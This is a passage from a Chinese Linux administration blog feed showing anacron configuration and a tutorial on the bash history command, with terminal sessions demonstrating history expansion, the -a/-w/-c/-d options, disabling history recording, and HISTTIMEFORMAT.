class="hljs-keyword">if</span> test -x <span class="hljs-regexp">/usr/</span>bin/on_ac_power; then<br>    <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/on_ac_power &gt;/</span>dev/null <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> test $? -eq <span class="hljs-number">1</span>; then<br>    <span class="hljs-keyword">exit</span> <span class="hljs-number">0</span><br>    fi<br>fi<br><span class="hljs-regexp">/usr/</span>sbin/anacron -s<br></code></pre></td></tr></table></figure><p>cat &#x2F;etc&#x2F;anacrontab</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs ruby">(base) [root<span class="hljs-variable">@110</span> cron]<span class="hljs-comment"># cat /etc/anacrontab</span><br><span class="hljs-comment"># /etc/anacrontab: configuration file for anacron</span><br><br><span class="hljs-comment"># See anacron(8) and anacrontab(5) for details.</span><br><br><span class="hljs-variable constant_">SHELL</span>=<span class="hljs-regexp">/bin/sh</span><br><span class="hljs-variable constant_">PATH</span>=<span class="hljs-regexp">/sbin:/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><br><span class="hljs-variable constant_">MAILTO</span>=root<br><span class="hljs-comment"># the maximal random delay added to the base delay of the jobs</span><br><span class="hljs-variable constant_">RANDOM_DELAY</span>=<span class="hljs-number">45</span><br><span class="hljs-comment"># the jobs will be started during the following hours only</span><br><span class="hljs-variable constant_">START_HOURS_RANGE</span>=<span class="hljs-number">3</span>-<span class="hljs-number">22</span><br><br><span class="hljs-comment">#period in days   delay in minutes   job-identifier   command</span><br><span class="hljs-number">1</span>       <span class="hljs-number">5</span>       cron.daily              nice run-parts /etc/cron.daily<br><span class="hljs-number">7</span>       <span class="hljs-number">25</span>      cron.weekly             nice run-parts /etc/cron.weekly<br><span class="hljs-variable">@monthly</span> <span class="hljs-number">45</span>     cron.monthly            nice run-parts /etc/cron.monthly<br></code></pre></td></tr></table></figure><p>cat &#x2F;etc&#x2F;anacrontab</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs ruby">(base) [root<span class="hljs-variable">@110</span> cron]<span class="hljs-comment"># cat /etc/anacrontab</span><br><span class="hljs-comment"># /etc/anacrontab: configuration file for anacron</span><br><br><span class="hljs-comment"># See anacron(8) and anacrontab(5) for details.</span><br><br><span class="hljs-variable constant_">SHELL</span>=<span class="hljs-regexp">/bin/sh</span><br><span class="hljs-variable constant_">PATH</span>=<span class="hljs-regexp">/sbin:/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><br><span class="hljs-variable constant_">MAILTO</span>=root<br><span class="hljs-comment"># the maximal random delay added to the base delay of the jobs</span><br><span class="hljs-variable constant_">RANDOM_DELAY</span>=<span class="hljs-number">45</span><br><span class="hljs-comment"># the jobs will be started during the following hours only</span><br><span class="hljs-variable constant_">START_HOURS_RANGE</span>=<span class="hljs-number">3</span>-<span class="hljs-number">22</span><br><br><span class="hljs-comment">#period in days   delay in minutes   job-identifier   command</span><br><span class="hljs-number">1</span>       <span class="hljs-number">5</span>       cron.daily              nice run-parts /etc/cron.daily<br><span class="hljs-number">7</span>       <span class="hljs-number">25</span>      cron.weekly             nice run-parts /etc/cron.weekly<br><span class="hljs-variable">@monthly</span> <span class="hljs-number">45</span>     cron.monthly            nice run-parts /etc/cron.monthly<br></code></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>crontab -l 无法查看到 &#x2F;etc&#x2F;cron.daily 目录下的定时任务</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>history</title>
    <link href="/2024/04/03/yunwei/yunweicommands/Linuxcommands/history/"/>
    <url>/2024/04/03/yunwei/yunweicommands/Linuxcommands/history/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="命令语法"><a href="#命令语法" class="headerlink" title="命令语法"></a>命令语法</h2><h3 id="history-num-显示指定条数的最新历史记录"><a href="#history-num-显示指定条数的最新历史记录" class="headerlink" title="history num 显示指定条数的最新历史记录"></a>history num 显示指定条数的最新历史记录</h3><p>history num</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# history 5<br>  106  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:54:02  ls<br>  107  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:54:07  cat /etc/bashrc<br>  108  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:54:55  vim ~/.bashrc<br>  109  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:55:55  man history<br>  110  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:58:48  history 5<br></code></pre></td></tr></table></figure><h3 id="num-重复执行指定记录"><a href="#num-重复执行指定记录" class="headerlink" title="!num 重复执行指定记录"></a>!num 重复执行指定记录</h3><p>计数都是从1开始的</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># history 5</span><br>  113  root 2022-08-14 11<span class="hljs-function">:01</span><span class="hljs-function">:48</span>  <span class="hljs-keyword">ls</span><br>  114  root 2022-08-14 11<span class="hljs-function">:02</span><span class="hljs-function">:02</span>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot; 1 &quot;</span> &gt; 1.txt<br>  115  root 2022-08-14 11<span class="hljs-function">:02</span><span class="hljs-function">:03</span>  <span class="hljs-keyword">ls</span><br>  116  root 2022-08-14 11<span class="hljs-function">:02</span><span class="hljs-function">:08</span>  <span class="hljs-keyword">history</span><br>  117  root 2022-08-14 11<span class="hljs-function">:02</span><span class="hljs-function">:15</span>  <span class="hljs-keyword">history</span> 5<br>[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># !115</span><br><span class="hljs-keyword">ls</span><br>1.txt<br>[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h3 id="num-从列表末尾开始计数指定第num行命令"><a href="#num-从列表末尾开始计数指定第num行命令" class="headerlink" title="!-num 从列表末尾开始计数指定第num行命令"></a>!-num 从列表末尾开始计数指定第num行命令</h3><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# history 10<br>   96  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:02:15  history 5<br>   97  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:02:26  ls<br>   98  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:05:46  history 5<br>   99  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:06:06  history<br>  100  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:06:20  ls<br>  101  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:36  hi<br>  102  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:41  hitory<br>  103  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:44  history<br>  104  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:59  history 6<br>  105  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:08:04  history 10<br>[root@iZbp1191gh7vw52537lyxrZ ~]# !<span class="hljs-string">-6</span><br>ls<br>1.txt<br></code></pre></td></tr></table></figure><h3 id="执行上一条命令"><a href="#执行上一条命令" class="headerlink" title="!! 执行上一条命令"></a>!! 执行上一条命令</h3><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# history 10<br>   96  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:02:15  history 5<br>   97  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:02:26  ls<br>   98  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:05:46  history 5<br>   99  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:06:06  history<br>  100  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:06:20  ls<br>  101  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:36  hi<br>  102  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:41  hitory<br>  103  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:44  history<br>  104  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:59  history 6<br>  105  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:08:04  history 10<br>[root@iZbp1191gh7vw52537lyxrZ ~]# !<span class="hljs-string">-6</span><br>ls<br>1.txt<br>[root@iZbp1191gh7vw52537lyxrZ ~]# !!<br>ls<br>1.txt<br></code></pre></td></tr></table></figure><h3 id="string-执行以某字符串开头的最新命令"><a href="#string-执行以某字符串开头的最新命令" class="headerlink" title="!string 执行以某字符串开头的最新命令"></a>!string 执行以某字符串开头的最新命令</h3><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# history | grep ls<br>    9  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:07:32  ls ~/.bash_history  -lat<br>   60  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-12</span> 15:49:47  ls<br>   62  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-12</span> 15:50:11  ls<br>   64  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-12</span> 15:56:38   ls<br>   65  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-12</span> 15:56:41  ls<br>   67  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-12</span> 15:56:45  ls<br>   71  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:41:02  ls<br>   73  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:41:05  ls<br>   76  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:41:19  ls<br>   85  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 10:54:02  ls<br>   92  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:01:48  ls<br>   94  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:02:03  ls<br>   97  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:02:26  ls<br>  100  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 11:06:20  ls<br>  106  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:08:22  ls<br>  107  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:11:34  lsls<br>  108  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:11:46  history | grep ls<br>[root@iZbp1191gh7vw52537lyxrZ ~]# !ls<br>lsls<br>-bash: lsls: 未找到命令<br></code></pre></td></tr></table></figure><h3 id="string-p-查找以字符串开头的最新命令"><a href="#string-p-查找以字符串开头的最新命令" class="headerlink" title="!string:p 查找以字符串开头的最新命令"></a>!string:p 查找以字符串开头的最新命令</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span> ~]<span class="hljs-meta"># !ls:p</span><br>lsls<br></code></pre></td></tr></table></figure><h3 id="string-执行包含字符串的最新命令"><a href="#string-执行包含字符串的最新命令" class="headerlink" title="!?string 执行包含字符串的最新命令"></a>!?string 执行包含字符串的最新命令</h3><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# history 5<br>  108  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:11:46  history | grep ls<br>  109  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:11:55  lsls<br>  110  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:15:08  pwd aaa<br>  111  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:15:25  pwd a23<br>  112  root 2022<span class="hljs-string">-08</span><span class="hljs-string">-14</span> 17:15:36  history 5<br>[root@iZbp1191gh7vw52537lyxrZ ~]# !?a<br>pwd a23<br>/root<br></code></pre></td></tr></table></figure><h3 id="history-d-num-删除指定行记录"><a href="#history-d-num-删除指定行记录" class="headerlink" title="history -d num 删除指定行记录"></a>history -d num 删除指定行记录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span> -d 2<br></code></pre></td></tr></table></figure><h3 id="history-c-清空当前用户当前终端历史记录"><a href="#history-c-清空当前用户当前终端历史记录" class="headerlink" title="history -c 清空当前用户当前终端历史记录"></a>history -c 清空当前用户当前终端历史记录</h3><p>历史记录文件.bash_history文件内容是存在的，新开终端，还是会存在之前的历史记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bash_history<br><br><span class="hljs-built_in">history</span><br><span class="hljs-comment">#1660663206</span><br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cd</span> /<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure><h3 id="history-a-追加当前终端新的历史记录到历史记录文件"><a href="#history-a-追加当前终端新的历史记录到历史记录文件" class="headerlink" title="history -a 追加当前终端新的历史记录到历史记录文件"></a>history -a 追加当前终端新的历史记录到历史记录文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">ls</span> test-a<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">ls</span> test-b<br><span class="hljs-built_in">ls</span>: 无法访问test-b: 权限不够<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">ls</span> test-a<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span> -a<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">ls</span> test-a<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">ls</span> test-b<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br></code></pre></td></tr></table></figure><h3 id="history-w-将整个历史记录写入历史记录文件"><a href="#history-w-将整个历史记录写入历史记录文件" class="headerlink" title="history -w 将整个历史记录写入历史记录文件"></a>history -w 将整个历史记录写入历史记录文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">ls</span> test-a<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">ls</span> test-b<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span> -a<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span><br>    1  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>    2  <span class="hljs-built_in">history</span><br>    3  <span class="hljs-built_in">ls</span> test-a<br>    4  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    5  <span class="hljs-built_in">history</span> -a<br>    6  <span class="hljs-built_in">history</span><br>    7  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    8  <span class="hljs-built_in">ls</span> test-b<br>    9  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   10  <span class="hljs-built_in">history</span> -a<br>   11  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   12  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>   13  <span class="hljs-built_in">history</span> -a<br>   14  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   15  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>   16  <span class="hljs-built_in">history</span><br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span> -w<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">ls</span> test-a<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">ls</span> test-b<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span> -a<br><span class="hljs-built_in">cat</span> ~/.bash_history<br><span class="hljs-built_in">rm</span> -rf ~/.bash_history<br><span class="hljs-built_in">history</span><br><span class="hljs-built_in">history</span> -w<br></code></pre></td></tr></table></figure><h3 id="set-o-history-禁止记录历史记录（当前会话生效）"><a href="#set-o-history-禁止记录历史记录（当前会话生效）" class="headerlink" title="set +o history 禁止记录历史记录（当前会话生效）"></a>set +o history 禁止记录历史记录（当前会话生效）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">set</span> +o <span class="hljs-built_in">history</span><br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span><br>    1  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>    2  <span class="hljs-built_in">history</span><br>    3  <span class="hljs-built_in">ls</span> test-a<br>    4  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    5  <span class="hljs-built_in">history</span> -a<br>    6  <span class="hljs-built_in">history</span><br>    7  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    8  <span class="hljs-built_in">ls</span> test-b<br>    9  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   10  <span class="hljs-built_in">history</span> -a<br>   11  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   12  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>   13  <span class="hljs-built_in">history</span> -a<br>   14  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   15  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>   16  <span class="hljs-built_in">history</span><br>   17  <span class="hljs-built_in">history</span> -w<br>   18  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   19  <span class="hljs-built_in">set</span> +o <span class="hljs-built_in">history</span><br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">ls</span> <span class="hljs-built_in">test</span>+ohistory<br><span class="hljs-built_in">ls</span>: 无法访问<span class="hljs-built_in">test</span>+ohistory: 权限不够<br>[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span><br>    1  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>    2  <span class="hljs-built_in">history</span><br>    3  <span class="hljs-built_in">ls</span> test-a<br>    4  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    5  <span class="hljs-built_in">history</span> -a<br>    6  <span class="hljs-built_in">history</span><br>    7  <span class="hljs-built_in">cat</span> ~/.bash_history<br>    8  <span class="hljs-built_in">ls</span> test-b<br>    9  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   10  <span class="hljs-built_in">history</span> -a<br>   11  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   12  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>   13  <span class="hljs-built_in">history</span> -a<br>   14  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   15  <span class="hljs-built_in">rm</span> -rf ~/.bash_history<br>   16  <span class="hljs-built_in">history</span><br>   17  <span class="hljs-built_in">history</span> -w<br>   18  <span class="hljs-built_in">cat</span> ~/.bash_history<br>   19  <span class="hljs-built_in">set</span> +o <span class="hljs-built_in">history</span><br></code></pre></td></tr></table></figure><h3 id="set-o-history-启动记录历史记录（当前会话生效）"><a href="#set-o-history-启动记录历史记录（当前会话生效）" class="headerlink" title="set -o history 启动记录历史记录（当前会话生效）"></a>set -o history 启动记录历史记录（当前会话生效）</h3><h2 id="history配置"><a href="#history配置" class="headerlink" title="history配置"></a>history配置</h2><h3 id="history格式配置"><a href="#history格式配置" class="headerlink" title="history格式配置"></a>history格式配置</h3><h4 id="HISTTIMEFORMAT-增加操作时间"><a href="#HISTTIMEFORMAT-增加操作时间" class="headerlink" title="HISTTIMEFORMAT 增加操作时间"></a>HISTTIMEFORMAT 增加操作时间</h4><p>export HISTTIMEFORMAT&#x3D;”%F %T “</p><p>%d 天</p><p>%m 月</p><p>%y 年</p><p>%H 小时</p><p>%M 分钟</p><p>%S 秒</p><p>%F 日期完整格式 